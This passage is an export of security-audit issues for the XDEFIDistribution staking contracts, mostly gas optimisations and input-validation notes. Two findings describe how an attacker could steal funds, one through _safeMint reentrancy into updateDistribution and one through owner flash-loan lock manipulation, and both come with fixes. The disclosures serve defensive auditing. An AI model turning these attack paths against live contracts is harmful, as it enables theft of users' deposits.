## Impact expensive gas, because in the line https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistributionHelper.sol#L23,  the tokenids.length is save to a new variable to be used in the for loop, instead of call tokenids.length directly in the for loop  ## Proof of Concept ``` pragma solidity =0.8.7;  contract pikir {      function putar1 (uint256 [] memory tokenIds) external view returns(uint256) {                  uint256 alltokens = tokenIds.length;         uint256 hasil;          for (uint256 i; i < alltokens; ++i){                          hasil += 1;          }         return hasil;      }  } //24714 gas  contract pikir2 {      function putar1 (uint256 [] memory tokenIds) external view returns(uint256) {              uint256 hasil;          for (uint256 i; i < tokenIds.length; ++i){                          hasil += 1;          }         return hasil;      }  } //24710 gas ```  ## Tools Used remix   "}, {"title": "Field bonusMultiplier of struct Position can be removed", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  wuwe1   # Vulnerability details  ## Proof of Concept  In contract `XDEFIDistribution`, the only use of `bonusMultiplier` is to calculate `units` in `_lock`.  In contract `XDEFIDistributionHelper`, `bonusMultiplier` is used for return value. However, `bonusMultiplier` can be calculated by `units * 100 / depositedXDEFI`.  "}, {"title": "Less than 256 uints are not gas efficient", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/97", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  Lower than uint256 size storage instance variables are actually less gas efficient. E.g. using uint32 does not give any efficiency, actually, it is the opposite as EVM operates on default of 256-bit values so uint32 is more expensive in this case as it needs a conversion. It only gives improvements in cases where you can pack variables together, e.g. structs.  ## Proof of Concept  1. Navigate to the following contracts.  ``` https://github.com/XDeFi-tech/xdefi-distribution/blob/master/contracts/XDEFIDistribution.sol#L301 ```  2. Expiry value is just used for the comparison with the block.timestamp.  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to review all uint types. Change them with uint256 If the integer is not necessary to present with uint32.  "}, {"title": "in function setLockPeriods, multiplier can be set to lower than 100", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/96", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact in function setLockPeriods multiplier can be set to lower than 100 which will break the calculation when dividing the multiplier in function _lock https://github.com/XDeFi-tech/xdefi-distribution/blob/master/contracts/XDEFIDistribution.sol#L268. If the amount times bonus multiplier below 100 the units value will be 0, therefore the totalUnits won't be added but the positionOf[tokenId_] bill be added.  ## Proof of Concept https://github.com/XDeFi-tech/xdefi-distribution/blob/master/contracts/XDEFIDistribution.sol#L77 https://github.com/XDeFi-tech/xdefi-distribution/blob/master/contracts/XDEFIDistribution.sol#L268  ## Tools Used  ## Recommended Mitigation Steps in function setLockPeriods need to be add  ```function setLockPeriods(uint256[] memory durations_, uint8[] memory multipliers) external onlyOwner {            uint256 count = durations_.length;          for (uint256 i; i < count; ++i) {             require(multipliers >= 100); //added             uint256 duration = durations_[i];             require(duration <= uint256(18250 days), \"INVALID_DURATION\");             emit LockPeriodSet(duration, bonusMultiplierOf[duration] = multipliers[i]);         }     } ```  "}, {"title": "`pointCorrection` can be stored in a uint256 rather than int256 to save gas from casting.", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Extra gas costs from unnecessary casting.  ## Proof of Concept  `pointsCorrection` is stored as a int256 variable.  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/interfaces/IXDEFIDistribution.sol#L15  However we can see that this variable is always negative (`_pointsPerUnit` and  `units` are both positive)  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L277  The only usage of `pointsCorrection` is in the `_withdrawableGiven` function as shown below.  https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L341-L342  ``` (   _toUint256Safe(       _toInt256Safe(_pointsPerUnit * uint256(units_)) +       pointsCorrection_   ) / _pointsMultiplier ) + uint256(depositedXDEFI_); ```  `pointsCorrection` is set to `_pointsPerUnit * uint256(units_)` when locking and `_pointsPerUnit` only increases so we can safely store `pointsCorrection as a positive uint256 (note this is an assumption of the original code as well) and simplify the above expression.  ``` // notice the sign change before `pointsCorrection_` (_pointsPerUnit * uint256(units_) - pointsCorrection_) / _pointsMultiplier + uint256(depositedXDEFI_); ```  We can then remove a significant amount of casting along with the associated costs.  ## Recommended Mitigation Steps  store `pointsCorrection` in a uint256 and subtract rather than add.  "}, {"title": "Various Non-Conformance to Solidity naming conventions", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/60", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Solidity defines a naming convention that should be followed.  ## Proof of Concept ``` Variable XDEFIDistribution.MAX_TOTAL_XDEFI_SUPPLY (contracts/XDEFIDistribution.sol#14) is not in mixedCase Constant XDEFIDistribution._pointsMultiplier (contracts/XDEFIDistribution.sol#17) is not in UPPER_CASE_WITH_UNDERSCORES Variable XDEFIDistribution._pointsPerUnit (contracts/XDEFIDistribution.sol#18) is not in mixedCase Variable XDEFIDistribution.XDEFI (contracts/XDEFIDistribution.sol#20) is not in mixedCase Variable XDEFIDistribution._zeroDurationPointBase (contracts/XDEFIDistribution.sol#30) is not in mixedCase Variable XDEFIDistribution._locked (contracts/XDEFIDistribution.sol#37) is not in mixedCase Function IXDEFIDistribution.XDEFI() (contracts/interfaces/IXDEFIDistribution.sol#37) is not in mixedCase ```  ## Tools Used Slither  ## Recommended Mitigation Steps Follow the Solidity naming convention: https://docs.soliditylang.org/en/v0.4.25/style-guide.html#naming-conventions  "}, {"title": "Owner can steal XDEFI without any capital risk", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/52", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  onewayfunction   # Vulnerability details  ## Impact The owner of the `XDEFIDistribution` contract can use flash loans to atomically steal XDEFI from the contract without taking on any capital risk.  ## Proof of Concept In my previous submission, \"Anyone can steal XDEFI from the `XDEFIDistribution` contract and make the contract insolvent\", I showed how any user can use the `onERC721Received` hook of the `_safeMint` function to steal XDEFI tokens from the contract and generally bork the contract's accounting. The attacker in that case took on some risk proportional to the minimum allowable `duration` and was limited in the amount they could steal based on their own capital available (how much XDEFI they had to use during the malicious lockup).  However, when a similar attack is performed by the `owner` of the `XDEFIDistribution` contract, it can be done (1) without the owner taking on any risk at all and (2) the owner can use flashloans to dramatically increase the amount of XDEFI they can steal.  In particular, the owner can perform all of the following in a single transaction (or in a single flashbots bundle):  First, the owner can call the [`setLockPeriods` function](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L77) to allow `0` duration locks with a large `multiplier`.  Next, they can flash borrow as much XDEFI as possible from DEXs and loaning platforms. Call this amount of XDEFI `X`.  Then they do a (normal) `0` duration lock with `X/2` XDEFI. This could give them a large proportion of locked XDEFI.  Next, they do the \"malicious lock\" technique that I previously reported, using the remaining `X/2` XDEFI. This means that their first lock with be able to withdraw more than `X/2` XDEFI when they unlock.  Then, in the same transaction -- which is possible because they are using a `0` duration lock -- they can unlock both thier first \"normal\" lock, as well as their \"malicious\" lock, giving them more than `X` XDEFI in total.  They can repay the flash loan, and keep the difference.  Since the never have to hold a lock for any positive duration, and never even have to have any exposure to XDEFI, the attack is risk free for them. And since they can use flash loans, they'll likely have access to dramatically more capital than a non-owner (who can't use flash loans) could.   ## Recommended Mitigation Steps  In addition to the \"use `_mint()` instead of `_safeMint()`\" suggestion from the previous submission, I also recommend adding a `require(duration > 0, \"INVALID_DURATION\");` statement just above [L82](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L82).  Not only will disallowing `0` duration locks prevent most flashloan shenanigans by the owner, it would also help prevent sandwich attacks that steal incoming distributableX DEFI tokens by sandwiching such incoming txs with a `lock` and `unlock` transaction.  "}, {"title": "Gas: `XDEFIDistribution.sol`'s `withdrawAmount` substraction can be unchecked", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Waste of gas due to unnecessary underflow checks  ## Proof of Concept   On `XDEFIDistribution.sol:120` and `XDEFIDistribution.sol:175`, you can find the following substraction: `uint256 withdrawAmount = amountUnlocked_ - lockAmount_;`  However, as the Solidity version is 0.8.10, default overflow and underflow checks are made, which cost some gas.  You can save this gas with the `unchecked` keyword to bypass these checks as 5 lines above (L115 and L170), a `require` statement already checks that `lockAmount_ <= amountUnlocked_`.   Therefore, no underflow is possible.  ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use the \"unchecked\" keyword   "}, {"title": "XDEFIDistribution: lock should be reused in lockWithPermit", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  PierrickGT   # Vulnerability details  ## Impact In [lockWithPermit](https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L99), we use the same code to transfer XDEFI and lock the position than in [lock](https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L92-96). We can create an internal function to reuse this code and avoid duplication.  ## Proof of Concept Create an internal function called `_lockPosition` that will transfer XDEFI and lock the position. This function will be called in `lock` and `lockWithPermit`.  ## Recommended Mitigation Steps The following change is recommended.  ``` function _lockPosition(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {     // Lock the XDEFI in the contract.     SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);      // Handle the lock position creation and get the tokenId of the locked position.     return _lock(amount_, duration_, destination_); }  function lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {     return _lockPosition(amount_, duration_, destination_); }  function lockWithPermit(uint256 amount_, uint256 duration_, address destination_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_) external noReenter returns (uint256 tokenId_) {     // Approve this contract for the amount, using the provided signature.     IEIP2612(XDEFI).permit(msg.sender, address(this), amount_, deadline_, v_, r_, s_);      return _lockPosition(amount_, duration_, destination_); } ```  "}, {"title": "setLockPeriods function lack of input validation", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/38", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  In the setLockPeriods function, there is no verification of the multipliers parameter, multipliers[i] may be 0, and the length of multipliers may not be equal to the length of durations_.  ```     function setLockPeriods(uint256[] memory durations_, uint8[] memory multipliers) external onlyOwner {         uint256 count = durations_.length;          for (uint256 i; i < count; ++i) {             uint256 duration = durations_[i];             require(duration <= uint256(18250 days), \"INVALID_DURATION\");             emit LockPeriodSet(duration, bonusMultiplierOf[duration] = multipliers[i]);         }     } ```  ## Proof of Concept  https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L77-L85  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  ```     function setLockPeriods(uint256[] memory durations_, uint8[] memory multipliers) external onlyOwner { +      require(durations_.length == multipliers.length);         uint256 count = durations_.length;          for (uint256 i; i < count; ++i) {             uint256 duration = durations_[i]; +         require(multipliers[i] != 0);             require(duration <= uint256(18250 days), \"INVALID_DURATION\");             emit LockPeriodSet(duration, bonusMultiplierOf[duration] = multipliers[i]);         }     } ```    "}, {"title": "MAX_TOTAL_XDEFI_SUPPLY should be constant", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  agusduha   # Vulnerability details  ## Impact  MAX_TOTAL_XDEFI_SUPPLY has always the same value and is used only in one place, it should be constant to optimize gas  ## Proof of Concept  Variable declaration: https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L14  Variable utilization: https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L255  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Add the \"constant\" keyword to the storage variable declaration  "}, {"title": "Use `calldata` instead of `memory` for external functions where the function argument is read-only.", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   On external functions, when using the `memory` keyword with a function argument, what's happening is that a `memory` acts as an intermediate.      Reading directly from `calldata` using `calldataload` instead of going via `memory` saves the gas from the intermediate memory operations that carry the values.      As an extract from [https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory](https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory) :   > `memory` and `calldata` (as well as `storage`) are keywords that define the data area where a variable is stored. To answer your question directly, `memory` should be used when declaring variables (both function parameters as well as inside the logic of a function) that you want stored in memory (temporary), and `calldata` _must_ be used when declaring an **external** function's **dynamic** parameters. The easiest way to think about the difference is that `calldata` is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.      ## Proof of Concept   ```   interfaces\\IXDEFIDistribution.sol:55:    function baseURI() external view returns (string memory baseURI_); interfaces\\IXDEFIDistribution.sol:74:    function setBaseURI(string memory baseURI_) external; interfaces\\IXDEFIDistribution.sol:77:    function setLockPeriods(uint256[] memory durations_, uint8[] memory multipliers) external; interfaces\\IXDEFIDistribution.sol:106:    function relockBatch(uint256[] memory tokenIds_, uint256 lockAmount_, uint256 duration_, address destination_) external returns (uint256 amountUnlocked_, uint256  newTokenId_); interfaces\\IXDEFIDistribution.sol:109:    function unlockBatch(uint256[] memory tokenIds_, address destination_) external returns (uint256 amountUnlocked_); interfaces\\IXDEFIDistribution.sol:119:    function merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_); interfaces\\IXDEFIDistribution.sol:125:    function tokenURI(uint256 tokenId_) external view returns (string memory tokenURI_); XDEFIDistribution.sol:73:    function setBaseURI(string memory baseURI_) external onlyOwner { XDEFIDistribution.sol:77:    function setLockPeriods(uint256[] memory durations_, uint8[] memory multipliers) external onlyOwner { XDEFIDistribution.sol:165:    function relockBatch(uint256[] memory tokenIds_, uint256 lockAmount_, uint256 duration_, address destination_) external noReenter returns (uint256 amountUnlocked_, uint256  newTokenId_) { XDEFIDistribution.sol:186:    function unlockBatch(uint256[] memory tokenIds_, address destination_) external noReenter returns (uint256 amountUnlocked_) { XDEFIDistribution.sol:205:    function merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) { ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `calldata` instead of `memory` for external functions where the function argument is read-only.  "}, {"title": "The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/25", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact  There is a reentrancy vulnerability in the _safeMint function  ```     function _safeMint(         address to,         uint256 tokenId,         bytes memory _data     ) internal virtual {         _mint(to, tokenId);         require(             _checkOnERC721Received(address(0), to, tokenId, _data),             \"ERC721: transfer to non ERC721Receiver implementer\"         );     }     ...     function _checkOnERC721Received(         address from,         address to,         uint256 tokenId,         bytes memory _data     ) private returns (bool) {         if (to.isContract()) {             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {                 return retval == IERC721Receiver.onERC721Received.selector; ```  The lock function changes the totalDepositedXDEFI variable after calling the _safeMint function  ```     function lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {         // Lock the XDEFI in the contract.         SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);          // Handle the lock position creation and get the tokenId of the locked position.         return _lock(amount_, duration_, destination_);     }     ...         function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {         // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.         require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");          // Get bonus multiplier and check that it is not zero (which validates the duration).         uint8 bonusMultiplier = bonusMultiplierOf[duration_];         require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");          // Mint a locked staked position NFT to the destination.         _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));          // Track deposits.         totalDepositedXDEFI += amount_;  ``` Since the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the _safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the _pointsPerUnit variable will become abnormally large.   ```      function updateDistribution() external {         uint256 totalUnitsCached = totalUnits;          require(totalUnitsCached> uint256(0), \"NO_UNIT_SUPPLY\");          uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());          if (newXDEFI == uint256(0)) return;          _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);          emit DistributionUpdated(msg.sender, newXDEFI);     }     ...     function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {         uint256 previousDistributableXDEFI = distributableXDEFI;         uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;          return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);     }   ``` If the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the _updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user   ```      function unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {         // Handle the unlock and get the amount of XDEFI eligible to withdraw.         amountUnlocked_ = _unlock(msg.sender, tokenId_);          // Send the the unlocked XDEFI to the destination.         SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);          // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.         _updateXDEFIBalance();     } ...      function _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {         // Check that the account is the position NFT owner.         require(ownerOf(tokenId_) == account_, \"NOT_OWNER\");          // Fetch position.         Position storage position = positionOf[tokenId_];         uint96 units = position.units;         uint88 depositedXDEFI = position.depositedXDEFI;         uint32 expiry = position.expiry;          // Check that enough time has elapsed in order to unlock.         require(expiry != uint32(0), \"NO_LOCKED_POSITION\");         require(block.timestamp >= uint256(expiry), \"CANNOT_UNLOCK\");          // Get the withdrawable amount of XDEFI for the position.         amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);          // Track deposits.         totalDepositedXDEFI -= uint256(depositedXDEFI);          // Burn FDT Position.         totalUnits -= units;         delete positionOf[tokenId_];          emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);     }     ...      function _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {         return             (                 _toUint256Safe(                     _toInt256Safe(_pointsPerUnit * uint256(units_)) +                     pointsCorrection_                 ) / _pointsMultiplier             ) + uint256(depositedXDEFI_);     }  ``` ## Proof of Concept  https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  ``` -    function updateDistribution() external  { +    function updateDistribution() external  noReenter { ```  "}, {"title": "Use Custom Errors to save Gas", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/22", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Custom errors from Solidity 0.8.4 are cheaper than revert strings.    ## Proof of Concept   Source: https://blog.soliditylang.org/2021/04/21/custom-errors/:  Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).  Instances include:   ```   XDEFIDistribution.sol:40:        require((XDEFI = XDEFI_) != address(0), \"INVALID_TOKEN\"); XDEFIDistribution.sol:47:        require(owner == msg.sender, \"NOT_OWNER\"); XDEFIDistribution.sol:52:        require(_locked == 0, \"LOCKED\"); XDEFIDistribution.sol:63:        require(pendingOwner == msg.sender, \"NOT_PENDING_OWNER\"); XDEFIDistribution.sol:82:            require(duration <= uint256(18250 days), \"INVALID_DURATION\"); XDEFIDistribution.sol:115:        require(lockAmount_ <= amountUnlocked_, \"INSUFFICIENT_AMOUNT_UNLOCKED\"); XDEFIDistribution.sol:145:        require(totalUnitsCached > uint256(0), \"NO_UNIT_SUPPLY\"); XDEFIDistribution.sol:170:        require(lockAmount_ <= amountUnlocked_, \"INSUFFICIENT_AMOUNT_UNLOCKED\"); XDEFIDistribution.sol:207:        require(count > uint256(1), \"MIN_2_TO_MERGE\"); XDEFIDistribution.sol:214:            require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\"); XDEFIDistribution.sol:215:            require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");  XDEFIDistribution.sol:227:        require(_exists(tokenId_), \"NO_TOKEN\"); XDEFIDistribution.sol:232:        require(_exists(tokenId_), \"NO_TOKEN\"); XDEFIDistribution.sol:255:        require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\"); XDEFIDistribution.sol:259:        require(bonusMultiplier != uint8(0), \"INVALID_DURATION\"); XDEFIDistribution.sol:295:        require(ownerOf(tokenId_) == account_, \"NOT_OWNER\"); XDEFIDistribution.sol:304:        require(expiry != uint32(0), \"NO_LOCKED_POSITION\"); XDEFIDistribution.sol:305:        require(block.timestamp >= uint256(expiry), \"CANNOT_UNLOCK\"); XDEFIDistribution.sol:322:        require(count > uint256(1), \"USE_UNLOCK\"); ```      ## Tools Used   VS Code    ## Recommended Mitigation Steps   Replace revert strings with custom errors.   "}, {"title": "`_safeMint` Will Fail Due To An Edge Case In Calculating `tokenId` Using The `_generateNewTokenId` Function", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/17", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  NFTs are used to represent unique positions referenced by the generated `tokenId`. The `tokenId` value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.  When positions are unlocked after expiring, the relevant position stored in the `positionOf` mapping is deleted, however, the NFT is not. The `merge()` function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, `_generateNewTokenId()` may end up using the same `totalSupply()` value, causing `_safeMint()` to fail if the same `amount_` and `duration_` values are used.  This edge case only occurs if there is an overlap in the `points_` and `totalSupply() + 1` values used to generate `tokenId`. As a result, this may impact a user's overall experience while interacting with the `XDEFI` protocol, as some transactions may fail unexpectedly.  ## Proof of Concept  ``` function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {     // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.     require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");      // Get bonus multiplier and check that it is not zero (which validates the duration).     uint8 bonusMultiplier = bonusMultiplierOf[duration_];     require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");      // Mint a locked staked position NFT to the destination.     _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));      // Track deposits.     totalDepositedXDEFI += amount_;      // Create Position.     uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));     totalUnits += units;     positionOf[tokenId_] =         Position({             units: units,             depositedXDEFI: uint88(amount_),             expiry: uint32(block.timestamp + duration_),             created: uint32(block.timestamp),             bonusMultiplier: bonusMultiplier,             pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)         });      emit LockPositionCreated(tokenId_, destination_, amount_, duration_); } ```  ``` function _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {     // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.     return (points_ << uint256(128)) + uint128(totalSupply() + 1); } ```  ``` function merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {     uint256 count = tokenIds_.length;     require(count > uint256(1), \"MIN_2_TO_MERGE\");      uint256 points;      // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.     for (uint256 i; i < count; ++i) {         uint256 tokenId = tokenIds_[i];         require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\");         require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");          _burn(tokenId);          points += _getPointsFromTokenId(tokenId);     }      // Mine a new NFT to the destinations, based on the accumulated points.     _safeMint(destination_, tokenId_ = _generateNewTokenId(points)); } ```  ## Tools Used  Manual code review. Discussions with Michael.  ## Recommended Mitigation Steps  Consider replacing `totalSupply()` in `_generateNewTokenId()` with an internal counter. This should ensure that `_generateNewTokenId()` always returns a unique `tokenId` that is monotomically increasing .  "}, {"title": "Missing event for admin function setBaseURI", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/16", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  BouSalman   # Vulnerability details  ## Vulnerability description In Contract **XDEFIDistribution** the function **setBaseURI** is missing an event for this admin functionality.  ## Impact Users can't monitor admin changes done to the contract to reflect it in their clients.  ## Proof of Concept https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L73  ## Tools Used manual code review.  ## Recommended Mitigation Steps create event for base URI changes and emit it.  "}, {"title": "Assert instead require to validate user inputs", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/14", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  robee   # Vulnerability details  From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix. With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.  You have reachable asserts in the following locations (which should be replaced by require / are mistakenly left from development phase):          XDEFIDistribution.sol : reachable assert in line 284         XDEFIDistribution.sol : reachable assert in line 288  "}, {"title": "Require with not comprehensive message", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/11", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  robee   # Vulnerability details   The following requires has a non comprehensive messages.  This is very important to add a comprehensive message for any require. Such that the user has enough  information to know the reason of failure:           Solidity file: XDEFIDistribution.sol, In line 227 with Require message: NO_TOKEN         Solidity file: XDEFIDistribution.sol, In line 232 with Require message: NO_TOKEN    "}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/9", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  robee   # Vulnerability details  Prefix increments are cheaper than postfix increments.  Further more, using unchecked {++x} is even more gas efficient, and the gas saving accumulates every iteration and can make a real change There is no risk of overflow caused by increamenting the iteration index in for loops (the `++i` in `for (uint256 i = 0; i < numIterations; ++i)`). But increments perform overflow checks that are not necessary in this case. These functions use not using prefix increments (`++x`) or not using the unchecked keyword:           just change to unchecked: XDEFIDistribution.sol, i, 80         just change to unchecked: XDEFIDistribution.sol, i, 212         just change to unchecked: XDEFIDistribution.sol, i, 325         just change to unchecked: XDEFIDistributionHelper.sol, i, 15         just change to unchecked: XDEFIDistributionHelper.sol, i, 29         just change to unchecked: XDEFIDistributionHelper.sol, i, 42   "}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2022-01-xdefi-findings/issues/8", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-xdefi-findings", "body": "# Handle  robee   # Vulnerability details  There are places in the code (especially in for-each loops) that loads the same array element more than once. In such cases, 